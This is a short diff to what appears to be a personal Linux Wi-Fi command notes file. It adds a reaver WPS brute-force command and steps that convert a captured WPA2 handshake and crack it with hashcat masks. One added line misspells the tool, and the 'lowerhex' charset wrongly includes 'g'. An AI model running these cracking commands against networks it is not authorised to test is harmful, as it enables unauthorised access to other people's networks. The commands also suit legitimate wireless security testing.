@@ -204,4 +204,11 @@ wpa_supplicant -B -D wext -i wlan0 -c /etc/wpa_supplicant.conf
 iw wlan0 link
 # if not
 dhclient wlan0
-
+------------------------------------------------------------------------------------
+reaver -i mon0 -b bssid -d 30 -S -N -vv
+------------------------------------------------------------------------------------
+cap2hccapx wpa2psk.dump wpa2psk.hccapx
+hashcap -m 2500 -a 3 wpa2psk.hccapx "?l?l?l?l?l?l?l?l"
+echo 0123456789abcdfg > lowerhex.hcchr
+hashcat -m 2500 -a 3 wpa2psk.hccapx -1 lowerhex.hcchr "?1?1?1?1?1?1?1?1"
+------------------------------------------------------------------------------------
